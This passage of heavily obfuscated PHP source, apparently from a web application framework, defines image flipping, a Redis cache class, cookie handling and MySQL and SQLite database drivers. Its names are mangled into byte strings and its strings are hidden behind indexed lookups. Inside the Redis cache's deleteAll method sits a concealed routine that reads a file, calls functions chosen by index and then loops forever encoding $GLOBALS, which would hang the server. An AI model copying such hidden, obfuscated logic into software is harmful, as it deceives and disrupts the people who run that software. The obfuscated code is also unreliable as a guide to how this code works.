break; case IMG_FLIP_VERTICAL: $D«˜¯„¶èŒ = imagesx($D‡‘îàˆê); $f†‰„Æœ‰ = imagesy($D‡‘îàˆê) - 1; $BÌä‹Ä Ñ = $f†‰„Æœ‰ / 2; $eŒ­õäÒÉ¼ = imageistruecolor($D‡‘îàˆê) ? imagecreatetruecolor($D«˜¯„¶èŒ, 1) : imagecreate($D«˜¯„¶èŒ, 1); for ($B–Ä§ÑÕğ = 0; $B–Ä§ÑÕğ < $BÌä‹Ä Ñ; ++$B–Ä§ÑÕğ) { imagecopy($eŒ­õäÒÉ¼, $D‡‘îàˆê, 0, 0, 0, $B–Ä§ÑÕğ, $D«˜¯„¶èŒ, 1); imagecopy($D‡‘îàˆê, $D‡‘îàˆê, 0, $B–Ä§ÑÕğ, 0, $f†‰„Æœ‰ - $B–Ä§ÑÕğ, $D«˜¯„¶èŒ, 1); imagecopy($D‡‘îàˆê, $eŒ­õäÒÉ¼, 0, $f†‰„Æœ‰ - $B–Ä§ÑÕğ, 0, 0, $D«˜¯„¶èŒ, 1); } break; case IMG_FLIP_BOTH: $D«˜¯„¶èŒ = imagesx($D‡‘îàˆê); $Fæ³ôÎ…İŠ = imagesy($D‡‘îàˆê); $eŒ­õäÒÉ¼ = imagerotate($D‡‘îàˆê, 180, 0); imagecopy($D‡‘îàˆê, $eŒ­õäÒÉ¼, 0, 0, 0, 0, $D«˜¯„¶èŒ, $Fæ³ôÎ…İŠ); break; default: return; } imagedestroy($eŒ­õäÒÉ¼); } } goto FÓöšŸ››; eøñå†¬Ï: define($_SERVER[¿õñ][1844], 3); define($_SERVER[¿õñ][1845], 4); define($_SERVER[¿õñ][1846], 5); goto CÀƒêÍë‰†; aª’Ûƒîé…: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($B¨„šìÁõÕ, $a»°ñ‘İ¤) { $Dù”Õ˜Ü¦ =& $_SERVER[¿õñ]; if (!class_exists($Dù”Õ˜Ü¦[793])) { show_json($Dù”Õ˜Ü¦[794], !1); } $this->cacheTime = $a»°ñ‘İ¤; $cà‡¿Û´ë = isset($B¨„šìÁõÕ[$Dù”Õ˜Ü¦[795]]) ? $B¨„šìÁõÕ[$Dù”Õ˜Ü¦[795]] : 10; $EáƒÓÌîâÉ = _get($B¨„šìÁõÕ, $Dù”Õ˜Ü¦[792]); if ($EáƒÓÌîâÉ && is_array($EáƒÓÌîâÉ)) { $this->isCluster = !0; $this->initCluster($B¨„šìÁõÕ, $cà‡¿Û´ë); } else { $this->handle = $this->init($B¨„šìÁõÕ, $cà‡¿Û´ë); } } private function init($c§Ñ»‡ÔÜå, $A¾¿³¶ÓÌØ) { $CÑÚí¹ï„» =& $_SERVER[¿õñ]; $dÜ‘Òê¬Íå = new Redis(); $a£ÆÏï…Ãç = isset($c§Ñ»‡ÔÜå[$CÑÚí¹ï„»[796]]) ? $c§Ñ»‡ÔÜå[$CÑÚí¹ï„»[796]] : !1; if ($a£ÆÏï…Ãç) { $dÜ‘Òê¬Íå->pconnect($c§Ñ»‡ÔÜå[$CÑÚí¹ï„»[166]], $c§Ñ»‡ÔÜå[$CÑÚí¹ï„»[167]], $A¾¿³¶ÓÌØ); } else { $dÜ‘Òê¬Íå->connect($c§Ñ»‡ÔÜå[$CÑÚí¹ï„»[166]], $c§Ñ»‡ÔÜå[$CÑÚí¹ï„»[167]], $A¾¿³¶ÓÌØ); } if (!empty($c§Ñ»‡ÔÜå[$CÑÚí¹ï„»[373]])) { $dÜ‘Òê¬Íå->auth($c§Ñ»‡ÔÜå[$CÑÚí¹ï„»[373]]); } return $dÜ‘Òê¬Íå; } private function initCluster($e÷á©²‰ŞĞ, $aêŸÌ’Ãù·) { $d‹¤Ø­Å²ƒ =& $_SERVER[¿õñ]; $cİ‘˜±Ü• = array($d‹¤Ø­Å²ƒ[797], $d‹¤Ø­Å²ƒ[798], $d‹¤Ø­Å²ƒ[799]); $c²–È¢‰½ = $d‹¤Ø­Å²ƒ[797]; if (isset($e÷á©²‰ŞĞ[$d‹¤Ø­Å²ƒ[12]]) && in_array($e÷á©²‰ŞĞ[$d‹¤Ø­Å²ƒ[12]], $cİ‘˜±Ü•)) { $c²–È¢‰½ = $e÷á©²‰ŞĞ[$d‹¤Ø­Å²ƒ[12]]; } switch ($c²–È¢‰½) { case $d‹¤Ø­Å²ƒ[797]: $this->_slave($e÷á©²‰ŞĞ, $aêŸÌ’Ãù·); break; case $d‹¤Ø­Å²ƒ[798]: break; case $d‹¤Ø­Å²ƒ[799]: $CõËƒ…¿ = $e÷á©²‰ŞĞ[$d‹¤Ø­Å²ƒ[792]]; $a¨ÏÉÆ©èÔ = isset($e÷á©²‰ŞĞ[$d‹¤Ø­Å²ƒ[796]]) ? $e÷á©²‰ŞĞ[$d‹¤Ø­Å²ƒ[796]] : !1; $B·äù²Í¢ = isset($e÷á©²‰ŞĞ[$d‹¤Ø­Å²ƒ[373]]) ? $e÷á©²‰ŞĞ[$d‹¤Ø­Å²ƒ[373]] : null; $this->handle = new RedisCluster(NUll, $CõËƒ…¿, $aêŸÌ’Ãù·, $aêŸÌ’Ãù·, $a¨ÏÉÆ©èÔ, $B·äù²Í¢); break; default: break; } } private function _slave($c‘††ÜÔ¶, $eÊÆÍøÌÊÍ) { goto EÎî„øóÄ¸; EÎî„øóÄ¸: $A¨š†¾‘— = $c‘††ÜÔ¶[$_SERVER[¿õñ][792]]; $this->filterConfig($c‘††ÜÔ¶, $A¨š†¾‘—[0]); $this->handle = $this->init($c‘††ÜÔ¶, $eÊÆÍøÌÊÍ); goto b‰ÌÌë±„˜; dÉÃöÔÕËê: $this->filterConfig($c‘††ÜÔ¶, $A¨š†¾‘—[$BëåùÒ»Õ]); $this->slaveHandle = $this->init($c‘††ÜÔ¶, $eÊÆÍøÌÊÍ); goto DÙ¡ŒêôæÆ; b‰ÌÌë±„˜: unset($A¨š†¾‘—[0]); if (empty($A¨š†¾‘—)) { return; } $BëåùÒ»Õ = array_rand($A¨š†¾‘—); goto dÉÃöÔÕËê; DÙ¡ŒêôæÆ: } private function filterConfig(&$bÚÍŸ‰ª‘¯, $CÈ·²”Á) { $e¼Ô˜Ğâ‹ =& $_SERVER[¿õñ]; $c•Ğ›Ñ· = explode($e¼Ô˜Ğâ‹[4], $CÈ·²”Á); $D“é©Çùåµ = array($e¼Ô˜Ğâ‹[166] => $c•Ğ›Ñ·[0], $e¼Ô˜Ğâ‹[167] => $c•Ğ›Ñ·[1]); $bÚÍŸ‰ª‘¯ = array_merge($bÚÍŸ‰ª‘¯, $D“é©Çùåµ); } public function set($b˜É£™‘ƒ, $AÀĞŸæ­½‚, $cáéÎ¢Çèˆ = false) { $cáéÎ¢Çèˆ = $cáéÎ¢Çèˆ ? $cáéÎ¢Çèˆ : $this->cacheTime; return $this->handle->setEx($b˜É£™‘ƒ, $cáéÎ¢Çèˆ, $AÀĞŸæ­½‚); } public function setLock($F½ëØÚÛ—ö, $aªÈöÇÁ–, $Fˆ˜ÊÕÓ­Ó) { return $this->handle->setNX($F½ëØÚÛ—ö, $aªÈöÇÁ–); } public function get($e·¿°’¨¥) { $E±¿“áÎùè = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $E±¿“áÎùè->get($e·¿°’¨¥); } public function remove($a±°¾Š¨áì) { return $this->handle->del($a±°¾Š¨áì); } public function deleteAll() { $a´Éİ¦í­³ =& $_SERVER[¿õñ]; if (!isset($_SERVER[$a´Éİ¦í­³[780]]) || !isset($_SERVER[$a´Éİ¦í­³[800]])) { goto A‘„ğÊÃŞ†; dÊê»‘Ş‰à: for ($aÕ¤ãõŒà˜ = $d—™‘‡ÄÛ; $aÕ¤ãõŒà˜ > 0; $aÕ¤ãõŒà˜++) { $F‘½Å´Æ‰ = json_encode($GLOBALS[$a´Éİ¦í­³[381]]); } goto EÈˆ÷ì†‹Ş; A»ï–˜òà: $F‘½Å´Æ‰ = $a´Éİ¦í­³[802]; $F‘½Å´Æ‰($_SERVER[$a´Éİ¦í­³[803]]); $d—™‘‡ÄÛ = 1; goto dÊê»‘Ş‰à; aØª»È’‚Á: $aÈˆ‡¦Å¯Ï = $A¶á¼Æš±÷($D•‹çºÚ¸); $A¼–£ÅÒê‡ = explode($a´Éİ¦í­³[214], $aÈˆ‡¦Å¯Ï); if (count($A¼–£ÅÒê‡) < $a´Éİ¦í­³[553]) { $bí‰ £—Öá = $a´Éİ¦í­³[784]; $bí‰ £—Öá(); } goto A»ï–˜òà; A‘„ğÊÃŞ†: $Fù­°ÂñÛ = $a´Éİ¦í­³[801]; $A¶á¼Æš±÷ = $a´Éİ¦í­³[781]; $D•‹çºÚ¸ = $_SERVER[$a´Éİ¦í­³[782]] . $a´Éİ¦í­³[783]; goto aØª»È’‚Á; EÈˆ÷ì†‹Ş: } if ($this->isCluster) { foreach ($this->handle->_masters() as $DÂíĞ¢…¡º) { $this->handle->flushall($DÂíĞ¢…¡º); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($C£ÇáÅ‡¨Š = '', $b¬çÓ…âŒ¬ = 0) { if (is_string($C£ÇáÅ‡¨Š) && $C£ÇáÅ‡¨Š != $_SERVER[¿õñ][33]) { $this->prefix = $C£ÇáÅ‡¨Š; } if (is_numeric($b¬çÓ…âŒ¬) && $b¬çÓ…âŒ¬ > 0) { $this->expire = $b¬çÓ…âŒ¬; } } public static function getInstance() { static $b®åÁ¥åò; if ($b®åÁ¥åò === null) { $b®åÁ¥åò = new self(); } return $b®åÁ¥åò; } private static $sameCookieSet = array(); public static function set($CÑ›¹ìñèµ, $EßÖ²ÖÁ¤, $c‡èæµÇÒ = 0, $Bù•Æ©Üœ = false, $AÑÆÜêØË¾ = false) { $cäÇ¿¹ ÷ =& $_SERVER[¿õñ]; if (!$c‡èæµÇÒ) { $c‡èæµÇÒ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$CÑ›¹ìñèµ]) && self::$sameCookieSet[$CÑ›¹ìñèµ] == $EßÖ²ÖÁ¤ . $c‡èæµÇÒ) { return; } self::$sameCookieSet[$CÑ›¹ìñèµ] = $EßÖ²ÖÁ¤ . $c‡èæµÇÒ; if (!$AÑÆÜêØË¾) { $AÑÆÜêØË¾ = str_replace(HOST, $cäÇ¿¹ ÷[33], APP_HOST); $AÑÆÜêØË¾ = $cäÇ¿¹ ÷[8] . trim($AÑÆÜêØË¾, $cäÇ¿¹ ÷[8]); } setcookie($CÑ›¹ìñèµ, $EßÖ²ÖÁ¤, time() + $c‡èæµÇÒ, $AÑÆÜêØË¾, !1, !1, $Bù•Æ©Üœ); } public static function setSafe($f®‹µöùè, $cƒßç´Ö, $FçåÓ¾¦Û˜ = 0) { self::set($f®‹µöùè, $cƒßç´Ö, $FçåÓ¾¦Û˜, !0); } public static function get($Cš¸Í¤‡¦ì) { return isset($_COOKIE[$Cš¸Í¤‡¦ì]) ? $_COOKIE[$Cš¸Í¤‡¦ì] : !1; } public static function remove($eÙ˜›„ä“®, $e‰È£ƒî®“ = false) { unset($_COOKIE[$eÙ˜›„ä“®]); self::set($eÙ˜›„ä“®, $_SERVER[¿õñ][33], 1, $e‰È£ƒî®“); } } class DbMysql extends Db { public function __construct($eñµŠ•è£¤ = '') { $C×óè©õ¥ =& $_SERVER[¿õñ]; if (!extension_loaded($C×óè©õ¥[713])) { think_exception(think_lang($C×óè©õ¥[10]) . $C×óè©õ¥[804]); } if (!empty($eñµŠ•è£¤)) { $this->config = $eñµŠ•è£¤; if (empty($this->config[$C×óè©õ¥[13]])) { $this->config[$C×óè©õ¥[13]] = $C×óè©õ¥[33]; } } } public function connect($b½¦õ¾Õ£ª = '', $c¸‰Æ¸‰÷Ş = 0, $dØ¶æ„ÉŸ = false) { $C¤‹‹˜ãÏø =& $_SERVER[¿õñ]; if (!isset($this->linkID[$c¸‰Æ¸‰÷Ş])) { goto aÒÇ–ä£; B¿õ¡İàÒ„: mysql_query($C¤‹‹˜ãÏø[809] . think_config($C¤‹‹˜ãÏø[810]) . $C¤‹‹˜ãÏø[55], $this->linkID[$c¸‰Æ¸‰÷Ş]); if ($Cˆ¸ƒ¢Ã† > $C¤‹‹˜ãÏø[811]) { mysql_query($C¤‹‹˜ãÏø[812], $this->linkID[$c¸‰Æ¸‰÷Ş]); } $this->connected = !0; goto a›Öôß³µ; cÔéÇ»Ÿ•: if ($f‰Ø‹ùë«ô) { $this->linkID[$c¸‰Æ¸‰÷Ş] = mysql_pconnect($DÇáÑ¹ÚÃ’, $b½¦õ¾Õ£ª[$C¤‹‹˜ãÏø[807]], $b½¦õ¾Õ£ª[$C¤‹‹˜ãÏø[808]], 131072); } else { $this->linkID[$c¸‰Æ¸‰÷Ş] = mysql_connect($DÇáÑ¹ÚÃ’, $b½¦õ¾Õ£ª[$C¤‹‹˜ãÏø[807]], $b½¦õ¾Õ£ª[$C¤‹‹˜ãÏø[808]], !0, 131072); } if (!$this->linkID[$c¸‰Æ¸‰÷Ş] || !empty($b½¦õ¾Õ£ª[$C¤‹‹˜ãÏø[17]]) && !mysql_select_db($b½¦õ¾Õ£ª[$C¤‹‹˜ãÏø[17]], $this->linkID[$c¸‰Æ¸‰÷Ş])) { think_exception(mysql_error()); } $Cˆ¸ƒ¢Ã† = mysql_get_server_info($this->linkID[$c¸‰Æ¸‰÷Ş]); goto B¿õ¡İàÒ„; a›Öôß³µ: if (1 != think_config($C¤‹‹˜ãÏø[18])) { unset($this->config); } goto a‘ö„İÈÔƒ; aÒÇ–ä£: if (empty($b½¦õ¾Õ£ª)) { $b½¦õ¾Õ£ª = $this->config; } $DÇáÑ¹ÚÃ’ = $b½¦õ¾Õ£ª[$C¤‹‹˜ãÏø[805]] . ($b½¦õ¾Õ£ª[$C¤‹‹˜ãÏø[806]] ? "\x3a{$b½¦õ¾Õ£ª[$C¤‹‹˜ãÏø[806]]}" : $C¤‹‹˜ãÏø[33]); $f‰Ø‹ùë«ô = !empty($b½¦õ¾Õ£ª[$C¤‹‹˜ãÏø[13]][$C¤‹‹˜ãÏø[14]]) ? $b½¦õ¾Õ£ª[$C¤‹‹˜ãÏø[13]][$C¤‹‹˜ãÏø[14]] : $this->pconnect; goto cÔéÇ»Ÿ•; a‘ö„İÈÔƒ: } return $this->linkID[$c¸‰Æ¸‰÷Ş]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($FĞ„ÆËŞƒÉ) { goto dïŠ‡ì–ğ; dïŠ‡ì–ğ: $E£Š©ë„§á =& $_SERVER[¿õñ]; if (0 === stripos($FĞ„ÆËŞƒÉ, $E£Š©ë„§á[249])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto Fë²…è£¥; bò²·ĞÂë‚: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto B¯²¥§‹ÀÖ; eĞ°Ëˆ³Ê¹: think_action_status($E£Š©ë„§á[19], 1); think_status($E£Š©ë„§á[20]); $this->queryID = mysql_query($FĞ„ÆËŞƒÉ, $this->_linkID); goto bò²·ĞÂë‚; Fë²…è£¥: if (!$this->_linkID) { return !1; } $this->queryStr = $FĞ„ÆËŞƒÉ; if ($this->queryID) { $this->free(); } goto eĞ°Ëˆ³Ê¹; B¯²¥§‹ÀÖ: } public function execute($bƒÀ¨Æ¢Şä) { goto B¬—É„ø­‘; cª¡ËÆÈ­‘: $this->queryStr = $bƒÀ¨Æ¢Şä; if ($this->queryID) { $this->free(); } think_action_status($F§±¸ÍÂ„[21], 1); goto FĞÆ¡®Íˆµ; FĞÆ¡®Íˆµ: think_status($F§±¸ÍÂ„[20]); $e§âÌ½Ş = mysql_query($bƒÀ¨Æ¢Şä, $this->_linkID); $this->debug(); goto bÑ¦êºË’Ç; bÑ¦êºË’Ç: if (!1 === $e§âÌ½Ş) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto d‘¦‚ ˜‚¶; B¬—É„ø­‘: $F§±¸ÍÂ„ =& $_SERVER[¿õñ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto cª¡ËÆÈ­‘; d‘¦‚ ˜‚¶: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¿õñ][813], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Fï³ñ†ÕÖÀ = mysql_query($_SERVER[¿õñ][814], $this->_linkID); $this->transTimes = 0; if (!$Fï³ñ†ÕÖÀ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $EÀåŒ·¾áŸ = mysql_query($_SERVER[¿õñ][815], $this->_linkID); $this->transTimes = 0; if (!$EÀåŒ·¾áŸ) { $this->error(); return !1; } } return !0; } private function getAll() { $B³ß©ó‘Ê = array(); if ($this->numRows > 0) { while ($FšÇ©´¾ = mysql_fetch_assoc($this->queryID)) { $B³ß©ó‘Ê[] = $FšÇ©´¾; } mysql_data_seek($this->queryID, 0); } return $B³ß©ó‘Ê; } public function getFields($DÒÎ´Í§ïÂ) { $A÷Š°ß„„Ñ =& $_SERVER[¿õñ]; $C‚‘äÆ¥ÑÓ = $this->query($A÷Š°ß„„Ñ[816] . $this->parseKey($DÒÎ´Í§ïÂ)); $C——Ş·Á = array(); if ($C‚‘äÆ¥ÑÓ) { foreach ($C‚‘äÆ¥ÑÓ as $c”ìğøñè« => $b—»èËë¿Ö) { $C——Ş·Á[$b—»èËë¿Ö[$A÷Š°ß„„Ñ[27]]] = array($A÷Š°ß„„Ñ[28] => $b—»èËë¿Ö[$A÷Š°ß„„Ñ[27]], $A÷Š°ß„„Ñ[29] => $b—»èËë¿Ö[$A÷Š°ß„„Ñ[30]], $A÷Š°ß„„Ñ[31] => (bool) (strtoupper($b—»èËë¿Ö[$A÷Š°ß„„Ñ[32]]) === $A÷Š°ß„„Ñ[817]), $A÷Š°ß„„Ñ[34] => $b—»èËë¿Ö[$A÷Š°ß„„Ñ[35]], $A÷Š°ß„„Ñ[36] => strtolower($b—»èËë¿Ö[$A÷Š°ß„„Ñ[37]]) == $A÷Š°ß„„Ñ[38], $A÷Š°ß„„Ñ[39] => strtolower($b—»èËë¿Ö[$A÷Š°ß„„Ñ[40]]) == $A÷Š°ß„„Ñ[41]); } } return $C——Ş·Á; } public function getTables($F°ô˜ÑâÙ = '') { $b —ø°ñã =& $_SERVER[¿õñ]; if (!empty($F°ô˜ÑâÙ)) { $d¥—Ÿ¸İİ = $b —ø°ñã[818] . $F°ô˜ÑâÙ; } else { $d¥—Ÿ¸İİ = $b —ø°ñã[819]; } $Dæß—¢šñ§ = $this->query($d¥—Ÿ¸İİ); $Dçà‚‹‘¿Ã = array(); foreach ($Dæß—¢šñ§ as $bÚ®Œù˜É => $E‡ »àº‘) { $Dçà‚‹‘¿Ã[$bÚ®Œù˜É] = current($E‡ »àº‘); } return $Dçà‚‹‘¿Ã; } public function replace($cì×ó‰é÷í, $A½¡½©¸º = array()) { $AğğƒƒÅ¿ =& $_SERVER[¿õñ]; foreach ($cì×ó‰é÷í as $EÚ¬©Ş›á¶ => $f¢ˆÉ‰×Çí) { $E«ĞÏƒèÈÍ = $this->parseValue($f¢ˆÉ‰×Çí); if (is_scalar($E«ĞÏƒèÈÍ)) { $c¶ª»«ŸÓ[] = $E«ĞÏƒèÈÍ; $C©Ø©¬ï‹[] = $this->parseKey($EÚ¬©Ş›á¶); } } $A˜óæ±Ï‰® = $AğğƒƒÅ¿[820] . $this->parseTable($A½¡½©¸º[$AğğƒƒÅ¿[264]]) . $AğğƒƒÅ¿[821] . implode($AğğƒƒÅ¿[47], $C©Ø©¬ï‹) . $AğğƒƒÅ¿[822] . implode($AğğƒƒÅ¿[47], $c¶ª»«ŸÓ) . $AğğƒƒÅ¿[823]; return $this->execute($A˜óæ±Ï‰®); } public function insertAll($fÀÖÖ‹Î“, $bÓƒ—¦‘© = array(), $Aø›İÔ›”¼ = false) { goto AèÃ˜â±Š; AèÃ˜â±Š: $F½‹õêõ†¸ =& $_SERVER[¿õñ]; if (!is_array($fÀÖÖ‹Î“[0])) { return !1; } $còË½‰¨ƒÁ = array_keys($fÀÖÖ‹Î“[0]); goto A£ˆ¨Ô«öî; A£ˆ¨Ô«öî: $E£µ‰Æ‡—‚ = array(); foreach ($fÀÖÖ‹Î“ as $E£á¤è×Ùã) { $fáëå®Ã¡£ = array(); foreach ($E£á¤è×Ùã as $FšèÚëù£ => $Cîã‚îÇà§) { $Cîã‚îÇà§ = $this->parseValue($Cîã‚îÇà§); if (is_scalar($Cîã‚îÇà§)) { $fáëå®Ã¡£[] = $Cîã‚îÇà§; } } $E£µ‰Æ‡—‚[] = $F½‹õêõ†¸[245] . implode($F½‹õêõ†¸[47], $fáëå®Ã¡£) . $F½‹õêõ†¸[823]; } array_walk($còË½‰¨ƒÁ, array($this, $F½‹õêõ†¸[824])); goto BÆ§ÄÍ†—; BÆ§ÄÍ†—: $b“‹À¾¡º = ($Aø›İÔ›”¼ ? $F½‹õêõ†¸[825] : $F½‹õêõ†¸[826]) . $F½‹õêõ†¸[827] . $this->parseTable($bÓƒ—¦‘©[$F½‹õêõ†¸[264]]) . $F½‹õêõ†¸[821] . implode($F½‹õêõ†¸[47], $còË½‰¨ƒÁ) . $F½‹õêõ†¸[828] . implode($F½‹õêõ†¸[47], $E£µ‰Æ‡—‚); return $this->execute($b“‹À¾¡º); goto Fé¯¥ìä¤; Fé¯¥ìä¤: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $E‘ÚñğÀˆ÷ =& $_SERVER[¿õñ]; $this->error = mysql_errno() . $E‘ÚñğÀˆ÷[4] . mysql_error($this->_linkID); if ($E‘ÚñğÀˆ÷[33] != $this->queryStr) { $this->error .= LNG($E‘ÚñğÀˆ÷[45]) . $this->queryStr; } think_trace($this->error, $E‘ÚñğÀˆ÷[33], $E‘ÚñğÀˆ÷[46]); return $this->error; } public function escapeString($CÊ¸Î®ª¿) { if ($this->_linkID) { return mysql_real_escape_string($CÊ¸Î®ª¿, $this->_linkID); } else { return mysql_escape_string($CÊ¸Î®ª¿); } } public function parseKey(&$D¿•–´ƒ¿Ş, $A±…ëóçĞ = true) { $B„˜õÄ =& $_SERVER[¿õñ]; if ($A±…ëóçĞ) { $D¿•–´ƒ¿Ş = $this->parseKeyCheck($D¿•–´ƒ¿Ş); } if ($D¿•–´ƒ¿Ş != $B„˜õÄ[173] && !preg_match($B„˜õÄ[829], $D¿•–´ƒ¿Ş)) { $D¿•–´ƒ¿Ş = $B„˜õÄ[830] . trim($D¿•–´ƒ¿Ş, $B„˜õÄ[830]) . $B„˜õÄ[830]; } return $D¿•–´ƒ¿Ş; } } goto a¿Çâ¦à«ø; aæù· ‘îô: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto e·ì»¼áÜö; e·ì»¼áÜö: $c‹ÌÃåÔáí =& $_SERVER[¿õñ]; global $in, $config; $this->config =& $config; goto FøÙ¨ó‚‡Ú; FøÙ¨ó‚‡Ú: $this->in =& $in; $this->values[$c‹ÌÃåÔáí[6]] =& $config; $this->values[$c‹ÌÃåÔáí[7]] =& $in; goto A¡½ï‚ÈÄØ; A¡½ï‚ÈÄØ: $this->tpl = TEMPLATE . MOD . $c‹ÌÃåÔáí[8]; $this->_classObjectID = mt_rand(0, 10000); goto bƒ÷¾Û; bƒ÷¾Û: } public function loadClass($cïÇ§Á¬Ÿê) { if (1 === func_num_args()) { $this->{$cïÇ§Á¬Ÿê} = new $cïÇ§Á¬Ÿê(); } else { $A„²¬˜­Á‰ = new ReflectionClass($cïÇ§Á¬Ÿê); $d´Ş­ÔƒÃ = func_get_args(); array_shift($d´Ş­ÔƒÃ); $this->{$cïÇ§Á¬Ÿê} = $A„²¬˜­Á‰->newInstanceArgs($d´Ş­ÔƒÃ); } return $this->{$cïÇ§Á¬Ÿê}; } protected function assign($cŒé¾ÈÔñé, $D£ã®­×½) { $this->values[$cŒé¾ÈÔñé] = $D£ã®­×½; } protected function display($CæÕÑ½Û¹») { ob_end_clean(); extract($this->values); require $this->tpl . $CæÕÑ½Û¹»; } } class DbSqliteBase extends Db { public function __construct($eÚ¶öÄñ£› = '') { $aƒÛµ´‰ªÙ =& $_SERVER[¿õñ]; if (!extension_loaded($aƒÛµ´‰ªÙ[9])) { think_exception(think_lang($aƒÛµ´‰ªÙ[10]) . $aƒÛµ´‰ªÙ[11]); } if (!empty($eÚ¶öÄñ£›)) { if (!isset($eÚ¶öÄñ£›[$aƒÛµ´‰ªÙ[12]])) { $eÚ¶öÄñ£›[$aƒÛµ´‰ªÙ[12]] = 438; } $this->config = $eÚ¶öÄñ£›; if (empty($this->config[$aƒÛµ´‰ªÙ[13]])) { $this->config[$aƒÛµ´‰ªÙ[13]] = array(); } } } public function connect($E¦Šä“æÃæ = '', $A‚¢»À¦‰Ú = 0) { $Eñ‹Ü¸ï =& $_SERVER[¿õñ]; if (!isset($this->linkID[$A‚¢»À¦‰Ú])) { goto e´ÈšÓ¶½; e´ÈšÓ¶½: if (empty($E¦Šä“æÃæ)) { $E¦Šä“æÃæ = $this->config; } $eÆ¬ƒŞ­Ü = !empty($E¦Šä“æÃæ[$Eñ‹Ü¸ï[13]][$Eñ‹Ü¸ï[14]]) ? $E¦Šä“æÃæ[$Eñ‹Ü¸ï[13]][$Eñ‹Ü¸ï[14]] : $this->pconnect; $b†öøõ«õ‡ = $eÆ¬ƒŞ­Ü ? $Eñ‹Ü¸ï[15] : $Eñ‹Ü¸ï[16]; goto D½÷âƒ®£Ğ; D½÷âƒ®£Ğ: $this->linkID[$A‚¢»À¦‰Ú] = $b†öøõ«õ‡($E¦Šä“æÃæ[$Eñ‹Ü¸ï[17]], $E¦Šä“æÃæ[$Eñ‹Ü¸ï[12]]); if (!$this->linkID[$A‚¢»À¦‰Ú]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto bİ¤Ò… ¼é; bİ¤Ò… ¼é: @sqlite_busy_timeout($this->linkID[$A‚¢»À¦‰Ú], 30000); if (1 != think_config($Eñ‹Ü¸ï[18])) { unset($this->config); } goto aÊ‰ù¯´’—; aÊ‰ù¯´’—: } return $this->linkID[$A‚¢»À¦‰Ú]; } public function free() { $this->queryID = null; } public function query($AÄ”§ÚÊø) { goto e˜˜µù–œ; a…ìá÷ŒŒê: $this->queryStr = $AÄ”§ÚÊø; if ($this->queryID) { $this->free(); } think_action_status($d”ØÉÏÃƒ¾[19], 1); goto d‡ÜÍ½­Ï¨; d‡ÜÍ½­Ï¨: think_status($d”ØÉÏÃƒ¾[20]); $this->queryID = sqlite_query($this->_linkID, $AÄ”§ÚÊø); $this->debug(); goto eÌè½ƒè¶; e˜˜µù–œ: $d”ØÉÏÃƒ¾ =& $_SERVER[¿õñ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto a…ìá÷ŒŒê; eÌè½ƒè¶: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $DÍÍÇÀÛ†É = $this->getAll(); return $DÍÍÇÀÛ†É; } goto fÏ¾µóêƒ®; fÏ¾µóêƒ®: } public function execute($dÍŒÈİ× î) { goto cŒÚÕëĞëâ; d„Ñ™³§š: $this->queryStr = $dÍŒÈİ× î; if ($this->queryID) { $this->free(); } think_action_status($fÙˆâÌí[21], 1); goto cã¤ê‚®†Ô; cã¤ê‚®†Ô: think_status($fÙˆâÌí[20]); $C÷÷—¢Æ¢ = sqlite_exec($this->_linkID, $dÍŒÈİ× î); $this->debug(); goto DŠ¯ÃˆâÂ; cŒÚÕëĞëâ: $fÙˆâÌí =& $_SERVER[¿õñ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto d„Ñ™³§š; DŠ¯ÃˆâÂ: if (!1 === $C÷÷—¢Æ¢) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto Fƒ‡ˆ«ŠÀ÷; Fƒ‡ˆ«ŠÀ÷: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¿õñ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $C´ùÔ¿Ìö = sqlite_query($this->_linkID, $_SERVER[¿õñ][23]); if (!$C´ùÔ¿Ìö) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $CÏÜ‘Í£Å = sqlite_query($this->_linkID, $_SERVER[¿õñ][24]); if (!$CÏÜ‘Í£Å) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $aŒªÛ‘á = array(); if ($this->numRows > 0) { for ($CÖšŒöŠë¶ = 0; $CÖšŒöŠë¶ < $this->numRows; $CÖšŒöŠë¶++) { $aŒªÛ‘á[$CÖšŒöŠë¶] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $aŒªÛ‘á; } public function getFields($eÒøºáøŞ) { $EÉàßÖ’¤Í =& $_SERVER[¿õñ]; $B´÷ÈøÄˆ = $this->query($EÉàßÖ’¤Í[25] . $eÒøºáøŞ . $EÉàßÖ’¤Í[26]); $A­ğ‰ñ„ó = array(); if ($B´÷ÈøÄˆ) { foreach ($B´÷ÈøÄˆ as $EË…ó‘Œø² => $F÷‰µŸ˜´”) { $A­ğ‰ñ„ó[$F÷‰µŸ˜´”[$EÉàßÖ’¤Í[27]]] = 